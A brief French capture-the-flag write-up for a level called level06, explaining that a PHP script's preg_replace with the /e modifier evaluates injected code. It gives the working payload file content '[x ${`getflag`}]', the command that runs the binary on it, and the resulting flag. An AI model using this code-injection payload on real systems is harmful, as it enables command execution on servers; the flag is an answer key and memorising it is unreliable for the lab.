Dans ce niveau on a un executable ```level06``` avec un fichier php ```level06.php```

En analysant le fichier php on se rend compte que le programme att un fichier en arg

En explorant ce qui se passe on voit ```$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);``` 

La faille est le ```/e``` qui interpretera le php qu'on lui injecte avant de passer par ```y()```

Donc on va creer un fichier avec le script php qu'on veut en respectant le regex ```echo '[x ${`getflag`}]' > /tmp/injection.txt```

Ensuite on execute le programme avec notre fichier en arg ```./level06 /tmp/injection.txt```

On obtient ainsi le flag = ```wiok45aaoguiboiki2tuin6ub```